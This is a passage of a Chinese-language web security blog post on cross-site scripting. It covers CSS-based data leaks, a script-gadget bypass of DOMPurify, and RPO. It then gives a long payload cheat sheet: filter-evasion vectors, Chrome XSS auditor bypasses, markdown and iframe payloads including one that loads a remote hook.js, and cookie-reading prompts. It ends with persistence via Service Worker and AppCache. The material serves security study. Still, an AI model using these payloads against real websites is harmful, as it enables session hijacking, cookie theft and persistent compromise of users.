punctuation\">;</span> <span class=\"token comment\">/* not fetched */</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre> <span class=\"token property\">unicode-range</span><span class=\"token punctuation\">:</span>U+0043<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token selector\">#sensitive-information</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre> <span class=\"token property\">font-family</span><span class=\"token punctuation\">:</span>poc<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>style</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>p</span> <span class=\"token attr-name\">id</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>sensitive-information<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>AB<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>p</span><span class=\"token punctuation\">></span></span></pre></td></tr></table></figure><p>当字符较多时，则可以结合  <code>::first-line</code>  等 CSS 属性缩小范围，以获取更精确的内容</p>\n<h2 id=\"bypass-via-script-gadgets\"><a class=\"anchor\" href=\"#bypass-via-script-gadgets\">#</a> Bypass Via Script Gadgets</h2>\n<h3 id=\"简介-3\"><a class=\"anchor\" href=\"#简介-3\">#</a> 简介</h3>\n<p>一些网站会使用白名单或者一些基于 DOM 的防御方式，对这些方式，有一种被称为  <code>Code Reuse</code>  的攻击方式可以绕过。该方式和二进制攻防中的 Gadget 相似，使用目标中的合法代码来达到绕过防御措施的目的。在论文  <code>Code-Reuse Attacks for the Web: Breaking Cross-Site Scripting Mitigations via Script Gadgets</code>  中有该方法的具体描述。</p>\n<p>portswigger 的一篇博文也表达了类似的想法  <code>https://portswigger.net/blog/abusing-javascript-frameworks-to-bypass-xss-mitigations</code> 。</p>\n<p>下面有一个简单的例子，这个例子使用了  <code>DOMPurify</code>  来加固，但是因为引入了  <code>jquery.mobile.js</code>  导致可以被攻击。</p>\n<h3 id=\"例子\"><a class=\"anchor\" href=\"#例子\">#</a> 例子</h3>\n<pre><code class=\"language-php+HTML\">// index.php\n&lt;?php\n\n$msg = $_GET['message'];\n$msg = str_replace(&quot;\\n&quot;, &quot;&quot;, $msg);\n$msg = base64_encode($msg);\n\n?&gt;\n\n&lt;!DOCTYPE html&gt;\n&lt;html lang=&quot;en&quot;&gt;\n&lt;head&gt;\n    &lt;meta charset=&quot;UTF-8&quot;&gt;\n    &lt;title&gt;Preview&lt;/title&gt;\n    &lt;script type=&quot;text/javascript&quot; src=&quot;purify.js&quot;&gt;&lt;/script&gt;\n    &lt;script type=&quot;text/javascript&quot; src=&quot;jquery.js&quot;&gt;&lt;/script&gt;\n    &lt;script type=&quot;text/javascript&quot; src=&quot;jquery.mobile.js&quot;&gt;&lt;/script&gt;\n&lt;/head&gt;\n&lt;body&gt;\n\n    &lt;script type=&quot;text/javascript&quot;&gt;\n    var d= atob('&lt;?php echo $msg; ?&gt;');\n    var cleanvar = DOMPurify.sanitize(d);\n    document.write(cleanvar);\n    &lt;/script&gt;\n\n&lt;/body&gt;\n&lt;/html&gt;\n// payload\n&lt;div data-role=popup id='--&gt;\n&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;'&gt;\n&lt;/div&gt;\n</code></pre>\n<h2 id=\"rporelative-path-overwrite\"><a class=\"anchor\" href=\"#rporelative-path-overwrite\">#</a> RPO(Relative Path Overwrite)</h2>\n<p>RPO (Relative Path Overwrite) 攻击又称为相对路径覆盖攻击，依赖于浏览器和网络服务器的反应，利用服务器的 Web 缓存技术和配置差异。</p>\n<h1 id=\"payload\"><a class=\"anchor\" href=\"#payload\">#</a> Payload</h1>\n<h2 id=\"常用\"><a class=\"anchor\" href=\"#常用\">#</a> 常用</h2>\n<ul>\n<li><code>&lt;script&gt;alert(/xss/)&lt;/script&gt;</code></li>\n<li><code>&lt;svg onload=alert(document.domain)&gt;</code></li>\n<li><code>&lt;img src=document.domain onerror=alert(document.domain)&gt;</code></li>\n<li><code>&lt;M onmouseover=alert(document.domain)&gt;M</code></li>\n<li><code>&lt;marquee onscroll=alert(document.domain)&gt;</code></li>\n<li><code>&lt;a href=javascript:alert(document.domain)&gt;M&lt;/a&gt;</code></li>\n<li><code>&lt;body onload=alert(document.domain)&gt;</code></li>\n<li><code>&lt;details open ontoggle=alert(document.domain)&gt;</code></li>\n<li><code>&lt;embed src=javascript:alert(document.domain)&gt;</code></li>\n</ul>\n<h2 id=\"大小写绕过\"><a class=\"anchor\" href=\"#大小写绕过\">#</a> 大小写绕过</h2>\n<ul>\n<li><code>&lt;script&gt;alert(1)&lt;/script&gt;</code></li>\n<li><code>&lt;sCrIpT&gt;alert(1)&lt;/sCrIpT&gt;</code></li>\n<li><code>&lt;ScRiPt&gt;alert(1)&lt;/ScRiPt&gt;</code></li>\n<li><code>&lt;sCrIpT&gt;alert(1)&lt;/ScRiPt&gt;</code></li>\n<li><code>&lt;ScRiPt&gt;alert(1)&lt;/sCrIpT&gt;</code></li>\n<li><code>&lt;img src=1 onerror=alert(1)&gt;</code></li>\n<li><code>&lt;iMg src=1 oNeRrOr=alert(1)&gt;</code></li>\n<li><code>&lt;ImG src=1 OnErRoR=alert(1)&gt;</code></li>\n<li><code>&lt;img src=1 onerror=&quot;alert(&quot;M&quot;)&quot;&gt;</code></li>\n<li><code>&lt;marquee onscroll=alert(1)&gt;</code></li>\n<li><code>&lt;mArQuEe OnScRoLl=alert(1)&gt;</code></li>\n<li><code>&lt;MaRqUeE oNsCrOlL=alert(1)&gt;</code></li>\n</ul>\n<h2 id=\"各种alert\"><a class=\"anchor\" href=\"#各种alert\">#</a> 各种 alert</h2>\n<ul>\n<li><code>&lt;script&gt;alert(1)&lt;/script&gt;</code></li>\n<li><code>&lt;script&gt;confirm(1)&lt;/script&gt;</code></li>\n<li><code>&lt;script&gt;prompt(1)&lt;/script&gt;</code></li>\n<li><code>&lt;script&gt;alert('1')&lt;/script&gt;</code></li>\n<li><code>&lt;script&gt;alert(&quot;1&quot;)&lt;/script&gt;</code></li>\n<li><code>&lt;script&gt;alert</code> 1 <code>&lt;/script&gt;</code></li>\n<li><code>&lt;script&gt;(alert)(1)&lt;/script&gt;</code></li>\n<li><code>&lt;script&gt;a=alert,a(1)&lt;/script&gt;</code></li>\n<li><code>&lt;script&gt;[1].find(alert)&lt;/script&gt;</code></li>\n<li><code>&lt;script&gt;top[&quot;al&quot;+&quot;ert&quot;](1)&lt;/script&gt;</code></li>\n<li><code>&lt;script&gt;top[&quot;a&quot;+&quot;l&quot;+&quot;e&quot;+&quot;r&quot;+&quot;t&quot;](1)&lt;/script&gt;</code></li>\n<li><code>&lt;script&gt;top[/al/.source+/ert/.source](1)&lt;/script&gt;</code></li>\n<li><code>&lt;script&gt;top[/a/.source+/l/.source+/e/.source+/r/.source+/t/.source](1)&lt;/script&gt;</code></li>\n</ul>\n<h2 id=\"伪协议\"><a class=\"anchor\" href=\"#伪协议\">#</a> 伪协议</h2>\n<ul>\n<li><code>&lt;a href=javascript:/0/,alert(%22M%22)&gt;M&lt;/a&gt;</code></li>\n<li><code>&lt;a href=javascript:/00/,alert(%22M%22)&gt;M&lt;/a&gt;</code></li>\n<li><code>&lt;a href=javascript:/000/,alert(%22M%22)&gt;M&lt;/a&gt;</code></li>\n<li><code>&lt;a href=javascript:/M/,alert(%22M%22)&gt;M&lt;/a&gt;</code></li>\n</ul>\n<h2 id=\"chrome-xss-auditor-bypass\"><a class=\"anchor\" href=\"#chrome-xss-auditor-bypass\">#</a> Chrome XSS auditor bypass</h2>\n<ul>\n<li><code>?param=https://&amp;param=@z.exeye.io/import%20rel=import%3E</code></li>\n<li><code>&lt;base href=javascript:/M/&gt;&lt;a href=,alert(1)&gt;M&lt;/a&gt;</code></li>\n<li><code>&lt;base href=javascript:/M/&gt;&lt;iframe src=,alert(1)&gt;&lt;/iframe&gt;</code></li>\n</ul>\n<h2 id=\"长度限制\"><a class=\"anchor\" href=\"#长度限制\">#</a> 长度限制</h2>\n<pre><code>&lt;script&gt;s+=&quot;l&quot;&lt;/script&gt;\n\\...\n&lt;script&gt;eval(s)&lt;/script&gt;\n</code></pre>\n<h2 id=\"jquery-sourcemappingurl\"><a class=\"anchor\" href=\"#jquery-sourcemappingurl\">#</a> jquery sourceMappingURL</h2>\n<pre><code>&lt;/textarea&gt;&lt;script&gt;var a=1//@ sourceMappingURL=//xss.site&lt;/script&gt;\n</code></pre>\n<h2 id=\"图片名\"><a class=\"anchor\" href=\"#图片名\">#</a> 图片名</h2>\n<pre><code>&quot;&gt;&lt;img src=x onerror=alert(document.cookie)&gt;.gif\n</code></pre>\n<h2 id=\"过期的payload\"><a class=\"anchor\" href=\"#过期的payload\">#</a> 过期的 payload</h2>\n<ul>\n<li>src=javascript:alert 基本不可以用</li>\n<li>css expression 特性只在旧版本 ie 可用</li>\n</ul>\n<h2 id=\"css\"><a class=\"anchor\" href=\"#css\">#</a> css</h2>\n<pre><code>&lt;div style=&quot;background-image:url(javascript:alert(/xss/))&quot;&gt;\n&lt;STYLE&gt;@import'http://ha.ckers.org/xss.css';&lt;/STYLE&gt;\n</code></pre>\n<h2 id=\"markdown\"><a class=\"anchor\" href=\"#markdown\">#</a> markdown</h2>\n<pre><code>[a](javascript:prompt(document.cookie))\n[a](j    a   v   a   s   c   r   i   p   t:prompt(document.cookie))\n&lt;&amp;#x6A&amp;#x61&amp;#x76&amp;#x61&amp;#x73&amp;#x63&amp;#x72&amp;#x69&amp;#x70&amp;#x74&amp;#x3A&amp;#x61&amp;#x6C&amp;#x65&amp;#x72&amp;#x74&amp;#x28&amp;#x27&amp;#x58&amp;#x53&amp;#x53&amp;#x27&amp;#x29&gt;\n![a'&quot;`onerror=prompt(document.cookie)](x)\n[notmalicious](javascript:window.onerror=alert;throw%20document.cookie)\n[a](data:text/html;base64,PHNjcmlwdD5hbGVydCgveHNzLyk8L3NjcmlwdD4=)\n![a](data:text/html;base64,PHNjcmlwdD5hbGVydCgveHNzLyk8L3NjcmlwdD4=)\n</code></pre>\n<h2 id=\"iframe-2\"><a class=\"anchor\" href=\"#iframe-2\">#</a> iframe</h2>\n<pre><code>&lt;iframe onload='\n    var sc   = document.createElement(&quot;scr&quot; + &quot;ipt&quot;);\n    sc.type  = &quot;text/javascr&quot; + &quot;ipt&quot;;\n    sc.src   = &quot;http://1.2.3.4/js/hook.js&quot;;\n    document.body.appendChild(sc);\n    '\n/&gt;\n</code></pre>\n<ul>\n<li><code>&lt;iframe src=javascript:alert(1)&gt;&lt;/iframe&gt;</code></li>\n<li><code>&lt;iframe src=&quot;data:text/html,&lt;iframe src=javascript:alert('M')&gt;&lt;/iframe&gt;&quot;&gt;&lt;/iframe&gt;</code></li>\n<li><code>&lt;iframe src=data:text/html;base64,PGlmcmFtZSBzcmM9amF2YXNjcmlwdDphbGVydCgiTWFubml4Iik+PC9pZnJhbWU+&gt;&lt;/iframe&gt;</code></li>\n<li><code>&lt;iframe srcdoc=&lt;svg/onload=alert(1)&gt;&gt;&lt;/iframe&gt;</code></li>\n<li><code>&lt;iframe src=https://baidu.com width=1366 height=768&gt;&lt;/iframe&gt;</code></li>\n<li><code>&lt;iframe src=javascript:alert(1) width=1366 height=768&gt;&lt;/iframe</code></li>\n</ul>\n<h2 id=\"form\"><a class=\"anchor\" href=\"#form\">#</a> form</h2>\n<ul>\n<li><code>&lt;form action=javascript:alert(1)&gt;&lt;input type=submit&gt;</code></li>\n<li><code>&lt;form&gt;&lt;button formaction=javascript:alert(1)&gt;M</code></li>\n<li><code>&lt;form&gt;&lt;input formaction=javascript:alert(1) type=submit value=M&gt;</code></li>\n<li><code>&lt;form&gt;&lt;input formaction=javascript:alert(1) type=image value=M&gt;</code></li>\n<li><code>&lt;form&gt;&lt;input formaction=javascript:alert(1) type=image src=1&gt;</code></li>\n</ul>\n<h2 id=\"meta\"><a class=\"anchor\" href=\"#meta\">#</a> meta</h2>\n<pre><code>&lt;META HTTP-EQUIV=&quot;Link&quot; Content=&quot;&lt;http://ha.ckers.org/xss.css&gt;; REL=stylesheet&quot;&gt;\n</code></pre>\n<h1 id=\"持久化\"><a class=\"anchor\" href=\"#持久化\">#</a> 持久化</h1>\n<h2 id=\"基于存储\"><a class=\"anchor\" href=\"#基于存储\">#</a> 基于存储</h2>\n<p>有时候网站会将信息存储在 Cookie 或 localStorage，而因为这些数据一般是网站主动存储的，很多时候没有对 Cookie 或 localStorage 中取出的数据做过滤，会直接将其取出并展示在页面中，甚至存了 JSON 格式的数据时，部分站点存在  <code>eval(data)</code>  之类的调用。因此当有一个 XSS 时，可以把 payload 写入其中，在对应条件下触发。</p>\n<p>在一些条件下，这种利用方式可能因为一些特殊字符造成问题，可以使用  <code>String.fromCharCode</code>  来绕过。</p>\n<h2 id=\"service-worker\"><a class=\"anchor\" href=\"#service-worker\">#</a> Service Worker</h2>\n<p>Service Worker 可以拦截 http 请求，起到类似本地代理的作用，故可以使用 Service Worker Hook 一些请求，在请求中返回攻击代码，以实现持久化攻击的目的。</p>\n<p>在 Chrome 中，可通过  <code>chrome://inspect/#service-workers</code>  来查看 Service Worker 的状态，并进行停止。</p>\n<h2 id=\"appcache\"><a class=\"anchor\" href=\"#appcache\">#</a> AppCache</h2>\n<p>在可控的网络环境下（公共 wifi），可以使用 AppCache 机制，来强制存储一些 Payload，未清除的情况下，用户访问站点时对应的 payload 会一直存在。</p>\n<h1 id=\"参考链接\"><a class=\"anchor\" href=\"#参考链接\">#</a> 参考链接</h1>\n<h2 id=\"wiki\"><a class=\"anchor\" href=\"#wiki\">#</a> wiki</h2>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL1VsdGltYXRlSGFja2Vycy9Bd2Vzb21lWFNT\">AwesomeXSS</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93M2MuZ2l0aHViLmlvL3dlYmFwcHNlYy1jc3Av\">w3c</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3dpc2VjL2RvbXhzc3dpa2kvd2lraQ==\">dom xss wiki</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9jb250ZW50LXNlY3VyaXR5LXBvbGljeS5jb20v\">content-security-policy.com</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9zaHVicy5pby9leHBsb2l0aW5nLW1hcmtkb3duLXN5bnRheC1hbmQtdGVsZXNjb3BlLXBlcnNpc3RlbnQteHNzLXRocm91Z2gtbWFya2Rvd24tY3ZlLTIwMTQtNTE0NC8=\">markdwon xss</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9icnV0ZWxvZ2ljLmNvbS5ici9ibG9nL2NoZWF0LXNoZWV0Lw==\">xss cheat sheet</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9odG1sNXNlYy5vcmcv\">html5 security cheatsheet</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cubmV0c3Bhcmtlci5jb20vd2hpdGVwYXBlci1odHRwLXNlY3VyaXR5LWhlYWRlcnMv\">http security headers</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2N1cmU1My9YU1NDaGFsbGVuZ2VXaWtpL3dpa2k=\">XSSChallengeWiki</span></li>\n</ul>\n<h2 id=\"challenges\"><a class=\"anchor\" href=\"#challenges\">#</a> Challenges</h2>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly94c3MtZ2FtZS5hcHBzcG90LmNvbS8=\">XSS Challenge By Google</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL3Byb21wdC5tbC8w\">prompt to win</span></li>\n</ul>\n<h2 id=\"css-2\"><a class=\"anchor\" href=\"#css-2\">#</a> CSS</h2>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL3d3dy50aGVzcGFubmVyLmNvLnVrLzIwMTQvMDMvMjEvcnBvLw==\">rpo</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL3d3dy56amljbWlzYS5vcmcvaW5kZXgucGhwL2FyY2hpdmVzLzEyNy8=\">rpo 攻击初探</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9jdXJlc2VjLmNvbS9ibG9nL2FydGljbGUvYmxvZy9SZWFkaW5nLURhdGEtdmlhLUNTUy1JbmplY3Rpb24tMTgwLmh0bWw=\">Reading Data via CSS</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL21rc2Jlbi5sMC5jbS8yMDE1LzEwL2Nzcy1iYXNlZC1hdHRhY2stYWJ1c2luZy11bmljb2RlLXJhbmdlLmh0bWw=\">css based attack abusing unicode range</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9zcGVha2VyZGVjay5jb20vbG10X3N3YWxsb3cvY3NzLWluamVjdGlvbi1wbHVzLXBsdXMtamktY3VuLXNob3UtZmEtZmFsc2VnYWktZ3Vhbi10b2R1aS1jZQ==\">css injection</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLnNoZWRkb3cueHl6L2Nzcy10aW1pbmctYXR0YWNrLw==\">css timing attack</span></li>\n</ul>\n<h2 id=\"同源策略-2\"><a class=\"anchor\" href=\"#同源策略-2\">#</a> 同源策略</h2>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9kZXZlbG9wZXIubW96aWxsYS5vcmcvZW4tVVMvZG9jcy9XZWIvU2VjdXJpdHkvU2FtZS1vcmlnaW5fcG9saWN5\">Same origin policy</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuYmVkZWZlbmRlZC5jb20vcGFwZXJzL2NvcnMtc2VjdXJpdHktZ3VpZGU=\">cors security guide</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9zcGVha2VyZGVjay5jb20vc2hobmprL2xvZ2ljYWxseS1ieXBhc3NpbmctYnJvd3Nlci1zZWN1cml0eS1ib3VuZGFyaWVz\">logically bypassing browser security boundaries</span></li>\n</ul>\n<h2 id=\"bypass-2\"><a class=\"anchor\" href=\"#bypass-2\">#</a> bypass</h2>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXN0LmdpdGh1Yi5jb20vSm9oYW5uZXNIb3BwZS81NjEyMjc0\">666 lines of xss payload</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL21hc2F0b2tpbnVnYXdhL2ZpbHRlcmJ5cGFzcw==\">xss auditor bypass</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cubGVhdmVzb25ncy5jb20vSFRNTC9jaHJvbWUteHNzLWF1ZGl0b3ItYnlwYXNzLWNvbGxlY3Rpb24uaHRtbA==\">xss auditor bypass writeup</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9wb3J0c3dpZ2dlci5uZXQvYmxvZy9ieXBhc3NpbmctY3NwLXVzaW5nLXBvbHlnbG90LWpwZWdz\">bypassing csp using polyglot jpegs</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuc2VjanVpY2UuY29tL2J5cGFzcy14c3MtZmlsdGVycy11c2luZy1qYXZhc2NyaXB0LWdsb2JhbC12YXJpYWJsZXMv\">bypass xss filters using javascript global variables</span></li>\n</ul>\n<h2 id=\"持久化-2\"><a class=\"anchor\" href=\"#持久化-2\">#</a> 持久化</h2>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL2Ryb3BzLndvb3l1bi5vcmcvd2ViLzEwNzk4\">变种 XSS 持久控制 by tig3r</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9zYWt1cml0eS5jb20vYmxvZy8yMDE1LzA4LzEzL21pZGRsZWtpdC5odG1s\">Using Appcache and ServiceWorker for Evil</span></li>\n</ul>\n<h2 id=\"tricks\"><a class=\"anchor\" href=\"#tricks\">#</a> Tricks</h2>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2V0aGVyZHJlYW0vc3ctc2Vj\">Service Worker 安全探索</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL0V0aGVyRHJlYW0vd2ViLWZyb250ZW5kLW1hZ2lj\">前端黑魔法</span></li>\n</ul>\n",
            "tags": [
                "网络安全",
                "漏洞",
                "XSS"
            ]
        }
    ]
}